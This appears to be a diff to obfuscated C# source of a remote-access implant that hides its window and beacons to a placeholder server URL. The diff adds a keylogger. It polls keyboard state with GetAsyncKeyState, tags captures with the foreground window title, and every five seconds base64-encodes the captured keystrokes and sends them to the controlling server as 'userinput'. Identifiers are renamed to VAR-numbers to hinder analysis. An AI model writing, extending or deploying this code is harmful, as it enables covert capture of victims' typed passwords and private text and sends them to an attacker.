@@ -1,6 +1,7 @@
 using System;
 using System.Threading;
 using System.Collections.Generic;
+using System.Windows.Forms;
 using System.Text;
 using System.Management.Automation;
 using System.Collections.ObjectModel;
@@ -11,6 +12,7 @@ using System.IO;
 using System.Security.Cryptography.X509Certificates;
 using System.Web.Script.Serialization;
 using System.Runtime.InteropServices;
+using System.Timers;
 
 namespace VAR1 {
 
@@ -37,18 +39,206 @@ namespace VAR1 {
   [DllImport("user32.dll")]
   static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);
 
-  protected static string VAR7;
-  protected static string VAR8;
-  protected static byte[] VAR9;
-  protected static int VAR10;
-  protected static string VAR11;
-  protected static int VAR12;
-  
-  public static void Main() {
-	ShowWindow(IntPtr.Zero, 0); 
-	VAR13("[URL]", "[KEY]", "[DELAY]");
+  [DllImport("user32.dll")]
+  static extern short GetAsyncKeyState(int VAR34);
+
+  [DllImport("user32.dll")]
+  static extern IntPtr GetForegroundWindow();
+
+  [DllImport("user32.dll")]
+  static extern int GetWindowText(IntPtr VAR92, StringBuilder VAR90, int VAR80);
+
+  [DllImport("user32.dll")]
+  static extern int GetWindowTextLength(IntPtr VAR79);
+
+  private static string VAR7;
+  private static string VAR8;
+  private static byte[] VAR9;
+  private static int VAR10;
+  private static string VAR11;
+  private static int VAR12;
+  private static StringBuilder VAR105 = new StringBuilder();
+
+  public static string VAR107() {
+   var VAR106 = "";
+   var VAR108 = GetForegroundWindow();
+   var VAR109 = GetWindowTextLength(VAR108) + 1;
+   var VAR110 = new StringBuilder(VAR109);
+   if (GetWindowText(VAR108, VAR110, VAR109) > 0) {
+    VAR106 = VAR110.ToString();
+   }
+   return VAR106;
   }
-  
+
+  public static void VAR110(object VAR111, ElapsedEventArgs VAR112) {
+   if (VAR105.Length != 0) {
+    byte[] VAR121 = Encoding.ASCII.GetBytes(VAR105.ToString());
+    string VAR120 = String.Format("userinput {0}", Convert.ToBase64String(VAR121));
+    VAR21(VAR120, Guid.NewGuid().ToString());
+   }
+   VAR105.Clear();
+  }
+
+  public static void VAR104() {
+
+   System.Timers.Timer VAR113 = new System.Timers.Timer();
+   VAR113.Elapsed += new ElapsedEventHandler(VAR110);
+   VAR113.Interval = 5000;
+   VAR113.Enabled = true;
+   string VAR114 = VAR107();
+   string VAR115 = VAR114;
+
+   while (true) {
+    foreach(int VAR116 in Enum.GetValues(typeof(Keys))) {
+     int VAR119 = GetAsyncKeyState(VAR116);
+     if (VAR119 == -32767) {
+
+      var VAR117 = Enum.GetName(typeof(Keys), VAR116).ToLower();
+
+      if (VAR116 == 1 || VAR116 == 2) {
+       string VAR118 = VAR107();
+
+       if (VAR115 != VAR118) {
+        VAR105.Append(String.Format("\n- {0}\n----\n", VAR118));
+        VAR115 = VAR118;
+
+       }
+      } else if (Control.ModifierKeys == Keys.Shift) {
+       if (VAR116 == 8) {
+        VAR105.Append("[BackSpace]");
+       } else if (VAR116 == 9) {
+        VAR105.Append("[Tab]");
+       } else if (VAR116 == 13) {
+        VAR105.Append("[Enter]");
+       } else if (VAR116 == 27) {
+        VAR105.Append("[Esc]");
+       } else if (VAR116 == 32) {
+        VAR105.Append(" ");
+       } else if (VAR116 == 48) {
+        VAR105.Append(")");
+       } else if (VAR116 == 49) {
+        VAR105.Append("!");
+       } else if (VAR116 == 50) {
+        VAR105.Append("@");
+       } else if (VAR116 == 51) {
+        VAR105.Append("#");
+       } else if (VAR116 == 52) {
+        VAR105.Append("$");
+       } else if (VAR116 == 53) {
+        VAR105.Append("%");
+       } else if (VAR116 == 54) {
+        VAR105.Append("^");
+       } else if (VAR116 == 55) {
+        VAR105.Append("&");
+       } else if (VAR116 == 56) {
+        VAR105.Append("*");
+       } else if (VAR116 == 57) {
+        VAR105.Append("(");
+       } else if (VAR116 >= 65 && VAR116 <= 90) {
+        VAR105.Append(VAR117.ToUpper());
+       } else if (VAR116 >= 96 && VAR116 <= 105) {
+        VAR105.Append(VAR117.ToUpper());
+       } else if (VAR116 >= 112 && VAR116 <= 135) {
+        VAR105.Append(VAR117.ToUpper());
+       } else if (VAR116 == 144) {
+        VAR105.Append("[NumLock]");
+       } else if (VAR116 == 186) {
+        VAR105.Append(":");
+       } else if (VAR116 == 187) {
+        VAR105.Append("+");
+       } else if (VAR116 == 188) {
+        VAR105.Append("<");
+       } else if (VAR116 == 189) {
+        VAR105.Append("_");
+       } else if (VAR116 == 190) {
+        VAR105.Append(">");
+       } else if (VAR116 == 191) {
+        VAR105.Append("?");
+       } else if (VAR116 == 192) {
+        VAR105.Append("~");
+       } else if (VAR116 == 219) {
+        VAR105.Append("{");
+       } else if (VAR116 == 220) {
+        VAR105.Append("|");
+       } else if (VAR116 == 221) {
+        VAR105.Append("}");
+       } else if (VAR116 == 222) {
+        VAR105.Append("\"");
+       }
+      } else {
+       if (VAR116 == 8) {
+        VAR105.Append("[BackSpace]");
+       } else if (VAR116 == 9) {
+        VAR105.Append("[Tab]");
+       } else if (VAR116 == 13) {
+        VAR105.Append("[Enter]\n");
+       } else if (VAR116 == 27) {
+        VAR105.Append("[Esc]");
+       } else if (VAR116 == 32) {
+        VAR105.Append(" ");
+       } else if (VAR116 == 48) {
+        VAR105.Append("0");
+       } else if (VAR116 == 49) {
+        VAR105.Append("1");
+       } else if (VAR116 == 50) {
+        VAR105.Append("2");
+       } else if (VAR116 == 51) {
+        VAR105.Append("3");
+       } else if (VAR116 == 52) {
+        VAR105.Append("4");
+       } else if (VAR116 == 53) {
+        VAR105.Append("5");
+       } else if (VAR116 == 54) {
+        VAR105.Append("6");
+       } else if (VAR116 == 55) {
+        VAR105.Append("7");
+       } else if (VAR116 == 56) {
+        VAR105.Append("8");
+       } else if (VAR116 == 57) {
+        VAR105.Append("9");
+       } else if (VAR116 >= 65 && VAR116 <= 90) {
+        VAR105.Append(VAR117);
+       } else if (VAR116 >= 96 && VAR116 <= 105) {
+        VAR105.Append(VAR117.ToUpper());
+       } else if (VAR116 >= 112 && VAR116 <= 135) {
+        VAR105.Append(VAR117.ToUpper());
+       } else if (VAR116 == 144) {
+        VAR105.Append("[NumLock]");
+       } else if (VAR116 == 186) {
+        VAR105.Append(";");
+       } else if (VAR116 == 187) {
+        VAR105.Append("=");
+       } else if (VAR116 == 188) {
+        VAR105.Append(",");
+       } else if (VAR116 == 189) {
+        VAR105.Append("-");
+       } else if (VAR116 == 190) {
+        VAR105.Append(".");
+       } else if (VAR116 == 191) {
+        VAR105.Append("/");
+       } else if (VAR116 == 192) {
+        VAR105.Append("`");
+       } else if (VAR116 == 219) {
+        VAR105.Append("[");
+       } else if (VAR116 == 220) {
+        VAR105.Append("\\");
+       } else if (VAR116 == 221) {
+        VAR105.Append("]");
+       } else if (VAR116 == 222) {
+        VAR105.Append("'");
+       }
+      }
+      break;
+     }
+    }
+   }
+  }
+
+  public static void Main() {
+   ShowWindow(IntPtr.Zero, 0);
+   VAR13("[URL]", "[KEY]", "[DELAY]");
+  }
+
   public static void VAR13(string VAR14, string VAR15, string VAR16) {
    VAR7 = VAR14;
    VAR8 = VAR37(16);
@@ -63,6 +253,8 @@ namespace VAR1 {
    string VAR19 = String.Format("register {0} {1}", VAR8, VAR20());
    VAR11 = Environment.OSVersion.ToString();
    VAR21(VAR19, null);
+   Thread VAR103 = new Thread(() => VAR104());
+   VAR103.Start();
    while (!VAR18) {
     try {
      Thread.Sleep(VAR10);
